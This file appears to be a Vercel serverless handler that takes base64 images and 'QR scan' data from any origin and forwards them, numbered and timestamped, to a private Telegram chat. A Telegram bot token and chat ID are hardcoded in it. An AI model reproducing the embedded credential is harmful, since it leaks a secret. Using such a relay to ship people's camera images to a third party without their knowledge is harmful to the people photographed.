// api/upload.js
export default async function handler(req, res) {
    // Разрешаем CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { image, qrData, photoNumber } = req.body;

        if (!image) {
            return res.status(400).json({ error: 'Нет данных изображения' });
        }

        console.log(`📸 Получено фото #${photoNumber || '?'}`);

        // Конвертируем base64 в buffer
        const matches = image.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);

        if (!matches || matches.length !== 3) {
            return res.status(400).json({ error: 'Неверный формат изображения' });
        }

        const imageBuffer = Buffer.from(matches[2], 'base64');

        // Данные Telegram (в Vercel нужно использовать переменные окружения)
        const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8719063394:AAElsz2JI_Z7pBepZpZ20JNeDzr9F4v5Iic';
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8312652652';

        // Отправляем в Telegram
        let telegramSuccess = false;
        try {
            // Создаем FormData для отправки
            const FormData = require('form-data');
            const axios = require('axios');

            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBuffer, {
                filename: `photo_${Date.now()}_${photoNumber || 1}.jpg`,
                contentType: 'image/jpeg'
            });
            formData.append('caption', 
                `📸 Сканирование QR-кода\n` +
                `🖼 Фото #${photoNumber || 1}\n` +
                `📅 Время: ${new Date().toLocaleString('ru-RU')}\n` +
                `🔗 Данные: ${qrData || 'не указаны'}`
            );

            const response = await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
                formData,
                {
                    headers: formData.getHeaders(),
                    maxContentLength: Infinity,
                    maxBodyLength: Infinity
                }
            );

            if (response.data.ok) {
                console.log('✅ Успешно отправлено в Telegram');
                telegramSuccess = true;
            }

        } catch (telegramError) {
            console.error('❌ Ошибка отправки в Telegram:', telegramError.message);
        }

        return res.status(200).json({
            success: true,
            message: telegramSuccess ? 'Фото отправлено в Telegram' : 'Фото обработано',
            telegram: telegramSuccess
        });

    } catch (error) {
        console.error('❌ Критическая ошибка:', error);
        return res.status(500).json({
            error: 'Ошибка при обработке фото',
            details: error.message
        });
    }
}